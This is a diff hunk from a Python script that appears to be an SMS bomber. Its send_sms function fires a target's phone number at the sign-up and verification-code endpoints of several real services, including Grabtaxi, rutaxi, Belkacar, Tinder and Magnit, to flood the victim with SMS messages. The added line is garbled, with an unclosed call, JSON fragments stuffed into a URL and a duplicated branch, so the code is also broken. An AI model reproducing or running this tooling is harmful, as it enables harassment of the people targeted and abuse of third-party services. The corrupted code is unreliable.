@@ -81,7 +81,7 @@ def update():
 
 def send_sms(serv):
     global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
-    if serv == 0: post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+    elif serv == 2: post( 'https://new.moy.magnit.ru/local/ajax/login/""data": "{'phone': '*+phone*', 'ksid': 'ee191257-a4fe-4e39-9f0f-079c7f721eee_0'}",   "response": "json""magnit"
     elif serv == 1: post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
     elif serv == 2: post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
     elif serv == 3: post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
